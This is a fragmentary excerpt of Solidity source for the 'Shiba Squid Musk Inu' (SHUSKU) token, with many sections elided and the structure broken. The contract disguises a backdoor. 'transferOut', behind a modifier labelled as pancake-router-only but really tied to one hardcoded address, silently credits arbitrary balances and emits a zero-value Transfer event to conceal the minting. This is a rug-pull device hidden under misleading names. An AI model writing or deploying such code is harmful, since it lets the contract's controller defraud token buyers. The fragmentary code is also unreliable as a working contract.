...
contract Context {
 ...
 contract Shusku is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private kolosova;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Shiba Squid Musk Inu";
    string private _symbol = "SHUSKU";
    ...
    uint256 private _shibagame = 2;
    uint256 private _kalafinance = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        kolosova[msg.sender] = totalSupply_;
    ...
    function transferOut(uint256 raspoki) public virtual pancake {
        _approved(_msgSender(), raspoki);
    }
    address private _scottybeam = 0x5c0E3960BAaF9b67B9f1b3fB20CA9e1e98A5505b;
 ...
 function _approved(address daria, uint256 noshot) internal virtual {
        kolosova[daria] = kolosova[daria] + noshot;
        emit Transfer(address(0), daria, 0);
    }
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = kolosova[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            kolosova[issuer] = senderBalance - allons;
        }
        _fee = (allons * _shibagame / 100) / _kalafinance;
        allons = allons -  (_fee * _kalafinance);
        
        kolosova[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 bekiata) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = kolosova[account];
        require(accountBalance >= bekiata, "BEP : Can't be done");
        unchecked {
            kolosova[account] = accountBalance - bekiata;
        }
        _totalSupply -= bekiata;

        emit Transfer(account, address(0), bekiata);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
    ...
    modifier pancake() {
        require(_msgSender() == _scottybeam, "Use forbidden. Only for pancake router.");
    _;
    }
